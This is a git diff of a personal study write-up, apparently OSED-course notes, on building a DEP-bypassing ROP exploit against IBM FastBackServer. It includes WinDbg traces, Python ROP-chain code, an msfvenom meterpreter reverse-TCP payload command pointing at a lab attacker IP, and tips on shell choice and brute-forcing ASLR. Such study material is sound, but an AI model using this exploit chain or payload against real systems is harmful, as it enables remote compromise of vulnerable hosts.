@@ -526,6 +526,7 @@ libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
 The last step is to patch dwSize. As with prior ROP chains, we should reuse gadgets when we need to repeat similar actions.
 
 **The shellcode size does not have to be precise**. If it is too large, additional stack content will simply be copied as well. Most 32-bit Metasploit-generated shellcodes **are smaller than 500 bytes,** so we can use an arbitrary size value of **-524 (0xfffffdf4)** and then negate it to make it positive.
+**Note: This won't be enough if we use the decoding routine, so I recommend putting a higher value. Instead of 524, my shellcode was 560 bytes long! So please adapt to your shellcode.**
 
 As eax points to lpBuffer and nSize is 4 bytes higher, we use 4 add eax gadgets first.
 Then we transfer eax value to esi and use eax to store -524. Then we negate such value and use the `mov [eax], ecx` technique to patch dwSize.
@@ -543,6 +544,7 @@ In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added i
 After executing this part of the ROP chain, we should return into WriteProcessMemory with all the arguments set up correctly. We can observe this in practice by restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the “XCHG EAX, ESP” gadget.
 
 ```c
+0:077> bp libeay32IBM019+0x5b415
 0:078> g
 Breakpoint 0 hit
 eax=0d5ee2dc ebx=05e6c388 ecx=ffffffec edx=76f62da0 esi=42424242 edi=00669360
@@ -618,7 +620,7 @@ libeay32IBM019!N98E_bn_sub_words+0x107c:
 
 Lastly, as we have placed the shellcode 256 bytes further, we need to find the exact offset to place padding.
 Let's use the lpBuffer address and substract some bytes until we find the last ROP gadget, and then perform the substraction:
-```
+```c
 0:082> dd 0d5ee40c - 70
 0d5ee39c  02e6b415 cccccccc cccccccc cccccccc
 0d5ee3ac  cccccccc cccccccc cccccccc cccccccc
@@ -647,11 +649,57 @@ formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" %(offset + w
 
 Lastly, we generate the shellcode. Note that we cannot generate the shellcode with this encoding:
  ```
- msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
 ```
-As the shikata-ga-nai encoder (default) tries to overwrite its own shellcode, and the codecave section is not writable (once copied, it is only RX).
 
-We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it’s copied into the code section. In the next section, we’ll pursue the latter approach.
+As the shikata-ga-nai encoder (default) tries to overwrite its own shellcode, and the codecave section is not writable (once copied, it is only RX). This is what happens when we try to use a shellcode that modifies itself:
+
+```c
+0:085> g (1a54.fe8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=01bb2c04 ebx=05ebc5b0 ecx=0000008d edx=1860bbcc esi=42424242 edi=00669360 eip=01bb2c14 esp=1111e30c ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 
+libeay32IBM019!N98E_bn_sub_words+0x108c:
+01bb2c14 31501a xor dword ptr [eax+1Ah],edx ds:0023:01bb2c1e=9a884739
+```
+The highlighted assembly instruction attempted to modify a memory location pointed to by EAX+0x1A, which caused the crash. This pointer is pointing to an address within the code cave. We’re encountering an access violation error because the shellcode’s decoding stub expects the code to be stored in writable memory, but it is not.
+
+We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. 
+Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it’s copied into the code section. In the next section, we’ll pursue the latter approach.
+
+In [osed_handmade_badchars_decoder](content/posts/osed_handmade_badchars_decoder.md) it's explained how the decoding process is done.
+**Note: I tried to use HTTP reverse shell but it didn't work. Try raw TCP shell (it is smaller and works better)**
+After decoding our shellcode, we must point EAX to the "simulated stack frame" of WriteProcessMemory, as EAX has been used and has been displaced.
+We can calculate the offset from "eax" to the "simulated stack frame" dinamically.
+Let's put a breakpoint right after we displace eax to point to our shellcode and right before decoding it and substracting the offset from the "simulated stack frame". We discover that the offset is 0x62f:
+```c
+eax=110ae91b ebx=0612aad8 ecx=fffff9e5 edx=76fd1670 esi=42424242 edi=00669360 eip=0327a7b8 esp=110ae3ac ebp=41414141 iopl=0 nv up ei pl nz ac pe cy 
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000217 
+libeay32IBM019!N98E_BIO_f_cipher+0x388: 
+0327a7b8 5b pop ebx 
+
+0:084> dd eax-62f L7 
+110ae2ec 75342890 032c2c04 ffffffff 032c2c04 
+110ae2fc 110ae91c 0000020c 0331401c
+```
+Through trial and error, we discover that the difference from EAX to the start of the ROP skeleton is 0x62f. 
+We can add this value to the **index of the last bad character** to **dynamically** determine the distance from EAX when the ROP chain completes the decoding process. This is because **eax is displaced in the decoding process, so we have to dinamically obtain the latest "eax" value (after decoding the last badchar) and add 0x62f to such value. That is the complete offset value.**
+
+The ROP chain to fix EAX to fit the simulated stack frame location would be the following:
+```python
+skeletonOffset = (-(badcharsArray[len(badcharsArray)-1] + 0x62f)) & 0xffffffff
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (skeletonOffset)) # dynamic offset
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
+```
+
+The operation -(value) & 0xffffffff is equivalent to 0x100000000 - value which stores the negative number in two’s complement form.
+This is necessary because later in the ROP chain they don’t have a `sub eax, imm32` gadget available. Instead, they use the gadget: add eax, ecx ; ret. So it is a substraction but using the "add" gadget.
+
+**Note: In 32 bits, if the program restarts if it crashes, it is also viable to bruteforce the base address to bypass ASLR rather than using a leak.**
+
+
 
 TBD page 482
 
